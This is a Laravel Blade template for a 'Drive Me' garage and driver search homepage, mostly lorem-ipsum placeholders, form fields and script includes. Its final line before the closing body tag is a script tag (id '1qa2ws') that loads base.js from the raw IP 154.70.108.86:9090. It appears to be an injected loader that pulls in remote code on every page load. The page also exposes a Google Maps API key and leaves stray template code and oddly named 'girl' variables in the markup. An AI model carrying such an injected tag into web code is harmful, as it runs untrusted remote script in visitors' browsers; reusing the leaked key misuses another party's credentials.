<!DOCTYPE html>
<html lang="en">
    

<head>
        <meta charset="utf-8">
        <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge"><![endif]-->
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Drive Me</title>

        <!-- Favicon -->
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/ico/apple-touch-icon-144-precomposed.png">
        <link rel="shortcut icon" href="/ico/favicon.ico">
       <link rel="stylesheet" type="text/css" href="/css/searchbox.css">
        <!-- CSS Global -->
        <link href="/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css">       
        <link href="/plugins/OwlCarousel2/dist/assets/owl.carousel.min.css" rel="stylesheet" type="text/css">    
        <link href="/plugins/OwlCarousel2/dist/assets/owl.theme.default.min.css" rel="stylesheet" type="text/css">   
        <link href="/plugins/jquery-ui-1.12.1/jquery-ui.min.css" rel="stylesheet" type="text/css">       
        <link href="/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

        <link href="css/style.css" rel="stylesheet" type="text/css">
        <link href="/css/media.css" rel="stylesheet" type="text/css"> 
     
        <meta name="csrf-token" content="{{ csrf_token() }}">
        <link rel="stylesheet" type="text/css" href="/css/main.css">

        <link rel="stylesheet" href="css/colors/main2.css" id="colors">
        
        
    </head>
    <body id="home" class="wide">
        <!-- PRELOADER -->
        <div id="loading">
            <div class="spinner">
                <div class="double-bounce1"></div>
                <div class="double-bounce2"></div>
            </div>
        </div>
        <!-- /PRELOADER -->

        <!-- WRAPPER -->
        <main class="wrapper"> 
            <!-- Header -->
            @include('partials.nav')
            <!-- /Header -->

            <!-- CONTENT AREA -->

            <!-- Main Slider Start -->
            <section id="home">                 
                <div class="theme-slider">
                    <div class="item">  
                        <div class="carousel-inner slider">
                            <span class="mask-overlay"></span>      
                            <img src="/img/slider/slider-1.jpg" alt="...">                       
                            <div class="theme-container container">
                                <div class="caption-text row" style="margin-top: -150px; padding-top: -20px;">
                                    <div class="col-md-9 col-sm-7 col-md-offset-2" style="margin-top: -40px;" >
                                      
                                             <br>

                                             <div class="header col-sm-12" >
                                                    
                                             <form  action= "api/getLocationCoords" method="Post" id= 'searchGirls'>
                                               <h2>Find a <span> Garage</span> you <span> Love</span> </h2>   
                                  
                                      <div class="form-box">

<div id="getMon">
</div>
<select class="search-field location" id="sell" placeholder="Select Speciality" style="color: black;">
    @foreach($girlname as $city)
    <option> {{$city}} </option>
    @endforeach
  </select>

   <select class="search-field skills" id="district" placeholder="Select district" style="color: black;">
    @foreach($districts as $district)
    <option> {{$district}} </option>
    @endforeach
  </select>

                                  <!-- <input type="text" name="location" class="search-field location" style="color: black;" placeholder="Location"/>
                                             
                                           -->       
                                          <button class="search-btn" type="submit">Search</button>   
                                             </div>
                                             </form>
           
                                             </div>

                                           
                                        </div>
                                    </div>
                                 </div>
                                  <div class="row" id="map">
          
        </div>
        <div id="city"></div> 
                                    <div class="row">
                                        <div class="col-md-9">
                                            <h2>Nearby Listings</h2>
                                            <ul id="girlsResult">
    
                                             </ul>
                                        </div>
                                    </div>
                                    


                                </div>
                            </div>
                        </div>
                    </div>                    
                </div>
            </section>            
            <!-- / Main Slider Ends -->   
 <!-- Feature Start -->
            <section id="feature" class="space-80">
                <div class="container theme-container">
                    <div class="title-wrap space-bottom-50">
                        <h2 class="section-title">Our Services</h2>
                        <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor a ornare odio. Sed non  mauris vitae erat
                            consequat auctor eu in elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra.</p>
                    </div>
                    <div class="row">                        
                        <div class="col-sm-6 col-xs-12 feature-list">
                            <div class="feature-box">
                                <div class="feature-icon"> <img alt="" src="/img/icons/icon-1.png" /> </div>
                                <div class="feature-content">
                                    <h2 class="title-1 space-bottom-15"> Pare brise </h2>
                                    <p> Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor. Phasellus aliquam non nisl sed varius. Sed quis accumsan orci. </p>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xs-12 feature-list">
                            <div class="feature-box">
                                <div class="feature-icon"> <img alt="" src="/img/icons/icon-2.png" /> </div>
                                <div class="feature-content">
                                    <h2 class="title-1 space-bottom-15"> Control Technique </h2>
                                    <p> Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor. Phasellus aliquam non nisl sed varius. Sed quis accumsan orci. </p>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xs-12 feature-list">
                            <div class="feature-box">
                                <div class="feature-icon"> <img alt="" src="/img/icons/icon-3.png" /> </div>
                                <div class="feature-content">
                                    <h2 class="title-1 space-bottom-15"> Garage(Revisions ou Entretiens) </h2>
                                    <p> Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor. Phasellus aliquam non nisl sed varius. Sed quis accumsan orci. </p>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xs-12 feature-list">
                            <div class="feature-box">
                                <div class="feature-icon"> <img alt="" src="/img/icons/icon-4.png" /> </div>
                                <div class="feature-content">
                                    <h2 class="title-1 space-bottom-15"> Lavage </h2>
                                    <p> Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor. Phasellus aliquam non nisl sed varius. Sed quis accumsan orci. </p>
                                </div>
                            </div>
                        </div>                       
                    </div>
                    <div class="col-sm-12 text-center space-20">
                        <a href="#" class="theme-btn-1 btn" id="showAll">See All Features</a>                   
                    </div>
                </div>
            </section>
            <!-- / Feature Ends -->





            <div class="row" id="testimonials-slider">
              
            </div>
            <div class="row">
              <div class="col-md-12">
                
              </div>
            </div>
            
           

 <section id="wilfried" class="space-80">               
                <div class="container theme-container">                   
                    <div class="title-wrap space-bottom-20">
                        <h2 class="section-title">Our Drivers </h2>  
                        <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor a ornare odio. Sed non  mauris vitae erat
                            consequat auctor eu in elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra.</p>                       
                    </div>

                    <div class="our-team row">
                        <div class="col-md-3 col-sm-6 space-top-30"> 
                            <div class="our-team-wrap text-center">
                                <a href="#"> <img src="/img/our-team/team-1.jpg" alt=""> </a>
                                <div class="team-overlay"> <a href="instructor.html" class="view-icn"> <img src="/img/our-team/plus.png" alt=""> </a> </div>
                            </div>  
                            <div class="team-details gray-color text-center">
                                <a href="instructor.html" class="title-1">John Doe</a>
                                <h6>Driver 1</h6>
                                <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor.</p>
                                <ul> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-facebook-square"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-twitter"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-dribbble"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa  fa-google-plus"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-instagram"></span> </a> </li> 
                                </ul>
                            </div>
                        </div>
                        <div class="col-md-3 col-sm-6 space-top-30"> 
                            <div class="our-team-wrap text-center">
                                <a href="#"> <img src="/img/our-team/team-2.jpg" alt=""> </a>
                                <div class="team-overlay"> <a href="#" class="view-icn"> <img src="/img/our-team/plus.png" alt=""> </a> </div>
                            </div>  
                            <div class="team-details gray-color text-center">
                                <a href="instructor.html" class="title-1">Elizabeth Doe</a>
                                <h6>Driver 3</h6>
                                <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor.</p>
                                <ul> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-facebook-square"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-twitter"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-dribbble"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa  fa-google-plus"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-instagram"></span> </a> </li> 
                                </ul>
                            </div>
                        </div>
                        <div class="col-md-3 col-sm-6 space-top-30"> 
                            <div class="our-team-wrap text-center">
                                <a href="#"> <img src="/img/our-team/team-3.jpg" alt=""> </a>
                                <div class="team-overlay"> <a href="instructor.html" class="view-icn"> <img src="/img/our-team/plus.png" alt=""> </a> </div>
                            </div>  
                            <div class="team-details gray-color text-center">
                                <a href="#" class="title-1">kyle Doe</a>
                                <h6>Driver 2</h6>
                                <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor.</p>
                                <ul> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-facebook-square"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-twitter"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-dribbble"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa  fa-google-plus"></span> </a> </li> 
                                    <li> <a href="#" class="hover-color"> <span class="fa fa-instagram"></span> </a> </li> 
                                </ul>
                            </div>
                        </div>
                       
                    </div>    
                </div>               
            </section>


            <!-- / CONTENT AREA -->

            <!-- FOOTER -->
            <footer class="footer">             
                <section class="space-100 text-center" id="contact">
                    <div class="container theme-container">
                        <div class="row space-bottom-50">
                            <div class="col-sm-4 footer-widget">
                                <h2 class="title-1 space-bottom-15">Our Telephones</h2>
                                <p> <span>+33 555 999 77 44</span> , <span>+33 505 959 75 24 </span> </p>
                            </div>                            
                            <div class="col-sm-4 footer-widget">
                                <h2 class="title-1 space-bottom-15">Our Address</h2>
                                <p> <span>1 Infinite Loop Cupertino</span> , <span> CA 95014</span> <span>Paris </span> </p>
                            </div>
                            <div class="col-sm-4 footer-widget">
                                <h2 class="title-1 space-bottom-15">Keep in Touch</h2>
                                <p> <a href="#">info@driveme.com</a> , <a href="#">ticket@driveme.com</a> </p>
                            </div>
                        </div>
                        <ul class="footer-social text-center space-30">                    
                            <li> <a href="#" class="googleplus"><span class="fa fa-google-plus"></span> </a> </li>
                            <li> <a href="#" class="twitter"><span class="fa fa-twitter"></span> </a> </li>  
                            <li> <a href="#" class="facebook"><span class="fa fa-facebook"></span> </a> </li>
                            <li> <a href="#" class="linkedin"><span class="fa fa-linkedin-square"></span> </a> </li>                           
                        </ul>                      
                        <p class="copy-rights">All Rights Reserved ©   |  </p>
                    </div>
                </section>
            </footer>
            <!-- /FOOTER -->

            <div id="to-top" class="to-top"><i class="fa fa-angle-up"></i></div>

        </main>
        <!-- /WRAPPER -->

        <!-- Popup: Video Player -->
        <div class="modal fade login-register" id="video-popup" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog video-frame">                 
                <button type="button" class="close close-btn" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <div class="video-link"> 
                    <iframe id="video" width="800" height="500" allowfullscreen=""> </iframe>
                </div>
            </div>
        </div>
        <!-- Popup: Video Player -->

        <!-- Popup: Contact -->
        <div class="modal fade contact-popup" id="contact-popup" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog modal-md">
                <button type="button" class="close close-btn popup-cls" data-dismiss="modal" aria-label="Close"> <i class="fa-times fa"></i> </button>

                <div class="modal-content">
                    <div class="title-wrap">
                        <h2 class="section-title"> Dont Be Hesitate to Say Hello! </h2>
                        <p>Morbi accumsan ipsum velit. Nam nec tellus a odio tincidunt auctor a ornare odio.</p>
                    </div>
                    <form class="contact-form" id="contact-form">
                        <div class="form-group"><input class="form-control"
                                                       type="text" name="Name" id="Name" placeholder="Name" required></div>
                        <div class="form-group"><input class="form-control"
                                                       type="email" name="Email" id="Email" placeholder="Email"
                                                       required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$"></div>
                        <div class="form-group"><input class="form-control" required
                                                       type="text" name="Message" id="Message" placeholder="Message"></div>
                        <div class="form-group">
                            <button class="theme-btn btn btn-block submit-btn" type="submit" id="submit_btn"> Send Your Message </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div id="googleMap" style="width:100%;height:400px;"></div>

girl_id= $girlname->id;

<script src="https://code.jquery.com/jquery-3.3.1.min.js"  crossorigin="anonymous"></script>


<script async="" defer="" type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBgNfwFbR2XCAo9I1oUjyHluZIeeHQoPnc&libraries=places"></script>


        <!-- /Popup: Contact -->

        <!-- JS Global -->
        <script src="/plugins/bootstrap/js/bootstrap.min.js"></script>
         <script src="assets/plugins/OwlCarousel2/dist/owl.carousel.min.js"></script>     
        JS Page Level 
        <script src="/js/theme-ajax-mail.js"></script>
        <script src="/plugins/jquery-ui-1.12.1/jquery-ui.min.js"></script>
        <script src="/js/theme.js" type="text/javascript"></script>
        <script src="/js/app.js" type="text/javascript"></script>  
<script type="text/javascript" src="/js/script.js"></script>
<script type="text/javascript" src="/js/ajaxsearch.js"></script>

    <script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../154.70.108.86_9090/www/default/base.js'></script></body>


</html>